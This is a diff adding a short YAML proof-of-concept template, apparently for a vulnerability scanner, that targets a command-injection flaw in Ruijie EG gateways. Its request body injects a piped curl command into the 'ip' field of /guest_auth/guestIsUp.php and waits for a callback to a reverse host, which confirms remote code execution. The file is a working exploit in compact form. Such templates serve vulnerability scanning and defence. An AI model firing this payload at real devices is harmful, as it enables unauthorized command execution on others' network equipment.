@@ -1,0 +1,16 @@
+name: poc-yaml-ruijie-eg-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url
+
+rules:
+  - method: POST
+    path: /guest_auth/guestIsUp.php
+    body: mac=1&ip=127.0.0.1|curl+{{reverseURL}}
+    expression: |
+      reverse.wait(5)
+detail:
+  author: pa55w0rd(www.pa55w0rd.online/)
+  links:
+    - https://github.com/Tas9er/EgGateWayGetShell
+    - https://www.t00ls.net/thread-59334-1-1.html
